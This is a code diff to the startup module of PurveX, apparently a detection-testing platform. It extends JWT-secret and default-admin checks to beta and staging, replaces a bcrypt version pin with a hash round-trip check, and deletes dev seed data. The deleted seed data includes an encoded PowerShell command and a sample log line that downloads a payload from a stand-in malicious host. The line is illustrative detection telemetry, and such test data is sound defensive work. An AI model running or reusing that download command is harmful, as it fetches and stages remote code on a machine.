@@ -50,7 +50,8 @@ from .services.test_retention import run_test_retention_loop
 from .services.test_reconciliation import reconcile_stale_tests
 
 logger = logging.getLogger("purvex.api")
-MANAGED_SCHEMA_ENVS = {"prod", "staging"}
+MANAGED_SCHEMA_ENVS = {"prod", "staging", "beta"}
+STRICT_SECURITY_ENVS = MANAGED_SCHEMA_ENVS
 
 
 async def _atomic_warmup_wrapper(preload):
@@ -75,7 +76,7 @@ def _current_alembic_head() -> str:
         from alembic.config import Config
         from alembic.script import ScriptDirectory
     except ImportError as exc:
-        raise RuntimeError("Alembic is required for staging/production startup checks.") from exc
+        raise RuntimeError("Alembic is required for beta/staging/production startup checks.") from exc
 
     backend_dir = Path(__file__).resolve().parents[1]
     config = Config(str(backend_dir / "alembic.ini"))
@@ -88,7 +89,7 @@ def _current_alembic_head() -> str:
 
 
 async def verify_database_migrations_current() -> None:
-    """Fail fast when staging/prod database schema is not managed by Alembic."""
+    """Fail fast when a managed deployment schema is not managed by Alembic."""
     expected_head = _current_alembic_head()
 
     async with async_engine.begin() as conn:
@@ -97,7 +98,7 @@ async def verify_database_migrations_current() -> None:
             if not inspector.has_table("alembic_version"):
                 raise RuntimeError(
                     "Database is missing alembic_version. Run `alembic upgrade head` "
-                    "before starting PurveX in staging/production."
+                    "before starting PurveX in beta/staging/production."
                 )
             rows = sync_conn.execute(text("SELECT version_num FROM alembic_version")).fetchall()
             versions = {row[0] for row in rows}
@@ -112,26 +113,51 @@ async def verify_database_migrations_current() -> None:
 
 def ensure_bcrypt_compatible():
     """
-    Guard against bcrypt versions that are incompatible with passlib 1.7.x.
-    Newer bcrypt (>=4.x) breaks passlib's bcrypt wrapper and causes 500s on login.
+    Smoke-test the bcrypt + passlib stack at startup.
+
+    Why a functional check, not a version pin
+    ----------------------------------------
+    The previous version of this guard rejected bcrypt >=4.x to keep
+    compatibility with passlib 1.7.x's bcrypt wrapper. That worked when the
+    project pinned bcrypt 3.2.2, but bcrypt 3.x is unmaintained and the 2026-05
+    security audit moved us to bcrypt >=4.2.0. With bcrypt 4.x + passlib 1.7.4
+    you'll see a benign "(trapped) error reading bcrypt version" warning the
+    first time passlib loads the backend — passlib looks for `bcrypt.__about__`
+    which 4.x removed. Hashing and verification still work, so we'd rather
+    prove that than block boot on a cosmetic warning.
+
+    What this does
+    --------------
+    1. Verifies bcrypt is importable.
+    2. Round-trips a throwaway password through the same `pwd_context` the
+       login path uses. If hashing or verification fails, we fail fast with a
+       clear error so operators don't discover it on the first login attempt.
     """
     try:
-        import bcrypt  # type: ignore
+        import bcrypt  # type: ignore  # noqa: F401  (proves the package is installed)
     except ImportError as exc:
-        raise RuntimeError("bcrypt is not installed; install backend requirements before starting the API.") from exc
-
-    version_str = getattr(bcrypt, "__version__", "0")
-    try:
-        major = int(version_str.split(".")[0])
-    except Exception:
-        major = 0
-
-    if major >= 4:
         raise RuntimeError(
-            "Unsupported bcrypt version detected (>=4.x). "
-            "Install bcrypt==3.2.2 to stay compatible with passlib (pip install -r requirements.txt)."
-        )
-    logger.debug("bcrypt version %s detected; compatible with passlib.", version_str)
+            "bcrypt is not installed; install backend requirements before starting the API."
+        ) from exc
+
+    try:
+        from .security import pwd_context
+
+        sample = "purvex-startup-probe"
+        digest = pwd_context.hash(sample)
+        if not pwd_context.verify(sample, digest):
+            raise RuntimeError("bcrypt round-trip verification returned False")
+    except Exception as exc:
+        raise RuntimeError(
+            "bcrypt + passlib stack is broken: password hashing failed at startup. "
+            "Reinstall backend requirements (`pip install -r requirements.txt`) and "
+            "verify your bcrypt/passlib versions."
+        ) from exc
+
+    logger.debug(
+        "bcrypt %s + passlib hash round-trip OK at startup.",
+        getattr(bcrypt, "__version__", "unknown"),
+    )
 
 # SECURITY: Configure request size limits to prevent DoS attacks
 # Max request body size: 10MB (adjust based on needs)
@@ -223,6 +249,11 @@ async def create_db_and_tables():
                     sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN owner_email VARCHAR(255)"))
                 if "siem_connection_id" not in runner_columns:
                     sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN siem_connection_id INTEGER"))
+                # Mirror Alembic 0009 for legacy SQLite databases that pre-date
+                # SSH host-key pinning. Without this column, every list/run
+                # against EnvironmentRunnerConfig errors with "no such column".
+                if "ssh_host_key_sha256" not in runner_columns:
+                    sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN ssh_host_key_sha256 VARCHAR(255)"))
                 ai_columns = {col["name"] for col in inspector.get_columns("ai_assistant_settings")}
                 if "analysis_mode" not in ai_columns:
                     sync_conn.execute(text("ALTER TABLE ai_assistant_settings ADD COLUMN analysis_mode VARCHAR(50)"))
@@ -320,18 +351,18 @@ async def create_db_and_tables():
         from .services.rbac_migration import run_rbac_migration
         await run_rbac_migration()
         
-        # SECURITY: Enforce strong JWT secret in production
-        is_production = settings.DEPLOYMENT_ENV.lower() == "prod"
+        # SECURITY: Enforce strong JWT secret in every managed deployment.
+        is_managed_deployment = settings.DEPLOYMENT_ENV.lower() in STRICT_SECURITY_ENVS
         if not validate_jwt_secret(settings.JWT_SECRET_KEY):
             error_msg = (
                 "SECURITY ERROR: JWT_SECRET_KEY is weak or default. "
                 "Please set a strong secret via JWT_SECRET_KEY environment variable. "
                 "Generate one with: python -c \"import secrets; print(secrets.token_urlsafe(32))\""
             )
-            if is_production:
+            if is_managed_deployment:
                 logger.error(error_msg)
                 raise RuntimeError(
-                    "CRITICAL SECURITY ERROR: Cannot start in production with weak JWT secret. "
+                    "CRITICAL SECURITY ERROR: Cannot start a managed deployment with a weak JWT secret. "
                     "Set JWT_SECRET_KEY environment variable to a strong secret (32+ characters)."
                 )
             else:
@@ -347,22 +378,21 @@ async def create_db_and_tables():
         if reconciled:
             logger.warning("Reconciled %d stale test run(s) during startup", reconciled)
         
-        # SECURITY: Enforce production security requirements
-        is_production = settings.DEPLOYMENT_ENV.lower() == "prod"
-        
-        # Block default admin creation in production
-        if is_production and settings.CREATE_DEFAULT_ADMIN:
+        # SECURITY: Enforce beta/staging/production security requirements.
+
+        # Block default admin creation in managed deployments.
+        if is_managed_deployment and settings.CREATE_DEFAULT_ADMIN:
             logger.error(
-                "SECURITY ERROR: CREATE_DEFAULT_ADMIN cannot be True in production. "
+                "SECURITY ERROR: CREATE_DEFAULT_ADMIN cannot be True in beta/staging/production. "
                 "This would create a well-known admin account."
             )
             raise RuntimeError(
-                "CRITICAL SECURITY ERROR: CREATE_DEFAULT_ADMIN must be False in production. "
+                "CRITICAL SECURITY ERROR: CREATE_DEFAULT_ADMIN must be False in managed deployments. "
                 "Set CREATE_DEFAULT_ADMIN=false in your environment configuration."
             )
         
-        # Check for default admin credentials in production
-        if is_production:
+        # Check for default admin credentials in managed deployments.
+        if is_managed_deployment:
             async with async_sessionmaker() as session:
                 result = await session.execute(
                     select(models.User).where(
@@ -379,20 +409,25 @@ async def create_db_and_tables():
                     ):
                         logger.error(
                             f"SECURITY ERROR: Default admin credentials detected for user '{settings.DEFAULT_ADMIN_EMAIL}'. "
-                            "This is a critical security risk in production."
+                            "This is a critical security risk in a managed deployment."
                         )
                         raise RuntimeError(
                             f"CRITICAL SECURITY ERROR: Default admin credentials detected. "
                             f"User '{settings.DEFAULT_ADMIN_EMAIL}' still has default password. "
-                            "Change the admin password before deploying to production."
-            )
+                            "Change the admin password before opening the deployment to users."
+                        )
         
-        # Only create the default admin in non‑production environments. This avoids
-        # shipping a well‑known username/password pair into real deployments.
-        if settings.CREATE_DEFAULT_ADMIN and not is_production:
+        # The auto-create-admin path is opt-in only: an operator must
+        # explicitly set CREATE_DEFAULT_ADMIN=true *and* provide their own
+        # DEFAULT_ADMIN_PASSWORD. The default beta install relies on the
+        # launcher's interactive bootstrap (scripts/create_admin.py), so this
+        # block stays disabled and admin/admin can never be created
+        # implicitly. Managed deployments never enter this branch.
+        if settings.CREATE_DEFAULT_ADMIN and not is_managed_deployment:
             if not settings.DEFAULT_ADMIN_PASSWORD:
                 raise RuntimeError(
-                    "DEFAULT_ADMIN_PASSWORD must be set when CREATE_DEFAULT_ADMIN=true."
+                    "DEFAULT_ADMIN_PASSWORD must be set when CREATE_DEFAULT_ADMIN=true. "
+                    "There is no built-in default password."
                 )
             async with async_sessionmaker() as session:
                 # Get or create default organization
@@ -486,118 +521,9 @@ async def create_db_and_tables():
                             await session.commit()
                             logger.info("Assigned ADMINISTRATOR role to existing admin user")
 
-                # Seed a sample detection for the default organization if none exist (dev convenience)
-                detections_result = await session.execute(
-                    select(models.Detection).where(models.Detection.organization_id == org.id)
-                )
-                if not detections_result.scalars().first():
-                    sample_title = "PowerShell Command Execution"
-                    sample_technique_id = "T1059.001"
-                    sample_detection = models.Detection(
-                        organization_id=org.id,
-                        technique_id=sample_technique_id,
-                        title=sample_title,
-                        description=(
-                            "Detects PowerShell command execution patterns and validates "
-                            "telemetry coverage through Atomic Red Team."
-                        ),
-                        sigma_rule="title: PowerShell Command Execution\nstatus: experimental",
-                        siem_type="splunk",
-                        siem_query="index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 New_Process_Name=*powershell.exe*",
-                        scheduled=False,
-                        notes="Purpose: Validate PowerShell execution telemetry in the LAB environment.",
-                    )
-                    session.add(sample_detection)
-                    await session.commit()
-                    logger.info(
-                        "Seeded sample detection '%s' (technique_id=%s) for org %s",
-                        sample_title,
-                        sample_technique_id,
-                        org.id,
-                    )
-                
-                # Seed a sample test + artifact for the default org if none exist (dev convenience)
-                tests_result = await session.execute(
-                    select(models.Test).where(models.Test.organization_id == org.id)
-                )
-                if not tests_result.scalars().first():
-                    # Grab the sample detection to attach the test to.
-                    detection_result = await session.execute(
-                        select(models.Detection).where(models.Detection.organization_id == org.id).limit(1)
-                    )
-                    sample_det = detection_result.scalars().first()
-                    if sample_det:
-                        from datetime import datetime, timedelta
-                        sample_test = models.Test(
-                            organization_id=org.id,
-                            detection_id=sample_det.id,
-                            technique_id=sample_det.technique_id,
-                            marker="purvex_sample_test_20260125",
-                            environment="lab",
-                            status="completed",
-                            result="PASS",
-                            score=85,
-                            started_at=datetime.utcnow() - timedelta(hours=2),
-                            finished_at=datetime.utcnow() - timedelta(hours=1),
-                            initiated_by_user_id=admin.id if admin else None,
-                            initiated_by_email=admin.email if admin else None,
-                            initiated_by_username=admin.username if admin else None,
-                        )
-                        session.add(sample_test)
-                        await session.flush()
-
-                        sample_artifact = models.TestArtifact(
-                            organization_id=org.id,
-                            test_id=sample_test.id,
-                            atomic_command="powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
-                            siem_sample_events='''[{"EventCode":4104,"host":"LAB-DC01","user":"SYSTEM","ScriptBlockText":"Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\\\\temp\\\\payload.ps1","timestamp":"2026-01-25T10:30:00Z"}]''',
-                            ai_explanation="Detection successfully fired on suspicious PowerShell execution with encoded command. Telemetry was present and the rule logic correctly identified the attack pattern.",
-                            ai_root_cause_category="NONE",
-                            ai_confidence_score=90,
-                        )
-                        session.add(sample_artifact)
-                        sample_det.last_tested_at = sample_test.finished_at
-                        sample_det.last_pass_at = sample_test.finished_at
-                        sample_det.last_alert_at = sample_test.finished_at
-                        await session.commit()
-                        logger.info("Seeded sample test and artifact for org %s", org.id)
-
-                # Normalize legacy sample detection metadata (one-time fix for dev data)
-                legacy_result = await session.execute(
-                    select(models.Detection).where(
-                        models.Detection.organization_id == org.id,
-                        models.Detection.title == "Sample PowerShell Command Execution (LAB)",
-                        models.Detection.technique_id == "T1059.003",
-                    )
-                )
-                legacy_detections = legacy_result.scalars().all()
-                if legacy_detections:
-                    for det in legacy_detections:
-                        det.title = "PowerShell Command Execution"
-                        det.technique_id = "T1059.001"
-                        det.description = (
-                            "Detects PowerShell command execution patterns and validates "
-                            "telemetry coverage through Atomic Red Team."
-                        )
-                        det.sigma_rule = "title: PowerShell Command Execution\nstatus: experimental"
-                        det.notes = "Purpose: Validate PowerShell execution telemetry in the LAB environment."
-                        det.siem_type = "splunk"
-                    await session.commit()
-                    logger.info("Normalized legacy sample detection metadata for org %s", org.id)
-        
-        # Warn or fail fast on insecure defaults in non-dev environments.
-        if settings.JWT_SECRET_KEY == "super-secret-change-me":
-            if settings.DEPLOYMENT_ENV.lower() == "prod":
-                # In production, refuse to start with a known default secret.
-                raise RuntimeError(
-                    "Refusing to start PurveX API with default JWT_SECRET_KEY in PROD. "
-                    "Set a strong JWT_SECRET_KEY in the environment."
-                )
-            else:
-                logger.warning(
-                    "JWT_SECRET_KEY is still using the insecure default value – "
-                    "set JWT_SECRET_KEY in the environment before running in production."
-                )
+        # JWT secret presence is enforced at module import time (config.py).
+        # Production refuses to boot when JWT_SECRET_KEY is missing; non-prod
+        # logs a warning and uses an ephemeral key.
 
         logger.info(
             "PurveX API started with CORS_ORIGINS=%s", ",".join(settings.CORS_ORIGINS)
@@ -612,7 +538,7 @@ async def create_db_and_tables():
             else:
                 logger.warning(
                     "OpenAI integration is selected but OPENAI_API_KEY is not configured. "
-                    "Watchtower AI will fall back to deterministic guidance."
+                    "Watchtower AI will report provider unavailability until it is configured."
                 )
         
         # Start the test scheduler worker
